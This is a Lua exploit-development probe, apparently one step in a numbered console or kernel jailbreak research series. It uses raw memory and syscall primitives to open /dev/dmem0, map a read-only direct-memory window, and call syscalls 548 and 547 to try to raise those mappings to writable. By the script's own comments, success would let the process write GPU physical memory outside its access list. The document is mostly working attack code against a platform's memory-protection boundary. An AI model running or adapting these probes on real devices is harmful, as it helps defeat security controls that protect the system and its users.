-- CRASH_CLASS: LOW -- asks 548 to change a protection and change it back. One guarded dword read
-- only after 548 reports the entry is now prot 3, and that read is last in the probe.
-- PROBE 1491a: can 548 raise the read-only dmem window?
--
-- 1410a/1411a/1412a measured the /dev/dmem0 offset space as two windows: 4 GiB of ACL'd aperture
-- where mmap accepts prot 0/1/2/3, and a second window above 0x120000000 that accepts only prot 0
-- and 1 - never 3 - with a lone extra rung at 0x1000000000. A window that mmap refuses to make
-- writable is the same shape as the prot-5 module texts, and 1490a showed those refuse 548 as well.
-- But the dmem pager is a different object from a vnode, and 1480c proved 548 does move device
-- entries, so the question is worth one measurement: is this window read-only by POLICY (max_prot
-- allows write, mmap simply asked for 1) or by max_prot?
--
-- If 548 raises it to 3, the process can write GPU physical addresses outside its ACL, which is a
-- boundary break even if the pages read as zeros.
--
-- [A] open /dev/dmem0
-- [B] mmap prot 1 at 0x120000000, 0x140000000, 0x1000000000 - whichever succeed
-- [C] 674: locate each mapping, print its prot and flags
-- [D] 548 op 2 -> prot 3 on each, 547 to confirm, then restore to 1
-- [E] one guarded dword read on any entry that became prot 3
--
-- -- prior art:
--   results/phase36_realargs/1410a_* and 1411a_* (the ACL boundary and the lone 0x1000000000 rung)
--   results/phase36_realargs/1412a_* (this window accepts only prot 0/1)
--   results/phase36_realargs/1490a_rx_to_rw_20261109_215813.txt (a read-only POLICY still refuses 548)
--   results/phase36_realargs/1480c_sys548_device_prot_20261109_200528.txt (548 does move device entries)

print("=== PROBE 1491a: DMEM READ-ONLY WINDOW UNDER 548 ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function sgn(v)
    local h, l = 0, N(v)
    if type(v) == "table" and v.h then h, l = N(v.h), N(v.l) end
    if (h % 4294967296) == 4294967295 and (l % 4294967296) == 4294967295 then return -1 end
    if h >= 0xFFFF8000 then return -1 end
    return h * 4294967296 + l
end
local function qw(a) return N(memory.read_dword(a + 4)) * 4294967296 + N(memory.read_dword(a)) end
local function nm(a, maxlen)
    local o = {}
    for i = 0, maxlen - 1 do
        local c = N(memory.read_byte(a + i))
        if c == 0 then break end
        if c >= 32 and c < 127 then o[#o + 1] = string.char(c) else o[#o + 1] = "." end
    end
    return table.concat(o)
end

local PID = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d", PID))

local sa = memory.alloc(0x80)
for i = 0, 0x60, 8 do pcall(function() memory.write_qword(sa + i, uint64(0)) end) end
pcall(function() memory.write_qword(sa, uint64(1)) end)
for _, s in ipairs({5, 6, 7, 8, 12, 24, 25, 26, 30, 31}) do
    pcall(function() return mk(416)(uint64(s), uint64(sa), uint64(0)) end)
end

local ent = memory.alloc(0x40)
local done = memory.alloc(0x10)
local rec = memory.alloc(0x40)

local function protect(addr, len, prot)
    for i = 0, 0x38 do pcall(function() memory.write_byte(ent + i, 0) end) end
    pcall(function() memory.write_qword(ent + 0x00, uint64(string.format("0x%X", addr))) end)
    pcall(function() memory.write_qword(ent + 0x10, uint64(string.format("0x%X", len))) end)
    pcall(function() memory.write_dword(ent + 0x18, uint64(prot)) end)
    pcall(function() memory.write_byte(ent + 0x1C, 2) end)
    pcall(function() memory.write_dword(done, uint64(0xEEEEEEEE)) end)
    local ok, rv = pcall(function()
        return N(mk(548)(uint64(0), uint64(0), uint64(ent), uint64(1), uint64(done), uint64(0)))
    end)
    if not ok then return "EXC", 0 end
    return rv, N(memory.read_dword(done))
end

local function map547(addr)
    for i = 0, 0x3C, 4 do pcall(function() memory.write_dword(rec + i, uint64(0)) end) end
    local ok, rv = pcall(function()
        return N(mk(547)(uint64(string.format("0x%X", addr)), uint64(rec), uint64(0), uint64(0), uint64(0), uint64(0)))
    end)
    if not ok or rv ~= 0 then return -1 end
    return N(memory.read_dword(rec + 0x10))
end

-- ---------------------------------------------------------------- [A] the descriptor
print("")
print("--- [A] open /dev/dmem0 ---")
local path = "/dev/dmem0"
local pb = memory.alloc(#path + 2)
for i = 1, #path do pcall(function() memory.write_byte(pb + i - 1, string.byte(path, i)) end) end
pcall(function() memory.write_byte(pb + #path, 0) end)
local FD = -1
do
    local ok, v = pcall(function() return mk(5)(uint64(pb), uint64(0x4002), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    if ok then FD = sgn(v) end
end
print(string.format("  fd=%d %s", FD, FD < 0 and es() or ""))

-- ---------------------------------------------------------------- [B] map the window
print("")
print("--- [B] mmap prot 1 at the read-only offsets ---")
local MAPS = {}
for _, off in ipairs({0x120000000, 0x140000000, 0x1000000000}) do
    for _, p in ipairs({1, 3}) do
        local ok, v = pcall(function()
            return mk(477)(uint64(0), uint64(0x4000), uint64(p), uint64(0x1), uint64(FD), uint64(string.format("0x%X", off)))
        end)
        local va = ok and sgn(v) or -1
        print(string.format("  off 0x%-11X prot %d -> 0x%X %s", off, p, va, va < 0 and es() or ""))
        if va > 0x10000 then MAPS[#MAPS + 1] = {va = va, off = off, prot = p, len = 0x4000} end
    end
end
if #MAPS == 0 then
    print("  nothing mapped; nothing to ask")
    print("=== PROBE 1491a INCOMPLETE ===")
    return
end

-- ---------------------------------------------------------------- [C] what the entry looks like
print("")
print("--- [C] 547 record for each mapping ---")
for _, m in ipairs(MAPS) do
    print(string.format("  0x%X (off 0x%X, asked prot %d): 547 prot %d", m.va, m.off, m.prot, map547(m.va)))
end

-- ---------------------------------------------------------------- [D] ask 548
print("")
print("--- [D] 548 op 2 -> prot 3, then restore ---")
local wins = {}
for _, m in ipairs(MAPS) do
    local before = map547(m.va)
    local rv, pr = protect(m.va, m.len, 3)
    local after = map547(m.va)
    local e = ""
    if rv == -1 then e = es() end
    print(string.format("  off 0x%-11X prot %d -> op2(3) rv=%-3s processed=%-2s %-22s -> %d %s",
        m.off, before, tostring(rv), tostring(pr), e, after,
        (rv == 0 and after == 3) and "*** WRITABLE ***" or ""))
    if rv == 0 and after == 3 then wins[#wins + 1] = m end
    local rb = protect(m.va, m.len, before)
    print(string.format("      restore -> rv=%s prot now %d", tostring(rb), map547(m.va)))
end
print(string.format("[D] entries that became writable: %d of %d", #wins, #MAPS))

-- ---------------------------------------------------------------- [E] one read, last
print("")
print("--- [E] guarded read of the first writable entry ---")
if #wins == 0 then
    print("  none became writable; nothing to read")
else
    local w = wins[1]
    protect(w.va, w.len, 3)
    print(string.format("  reading 0x%X at prot %d ...", w.va, map547(w.va)))
    local v = nil
    local ok = pcall(function() v = N(memory.read_dword(w.va)) end)
    if ok and v ~= nil then
        print(string.format("  +0x00 = %08X", v))
    else
        print("  the read raised")
    end
    protect(w.va, w.len, 1)
end

local final = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print("")
print(string.format("final canary live: %s (pid %d)", tostring(final == PID), PID))
print("=== PROBE 1491a COMPLETE ===")
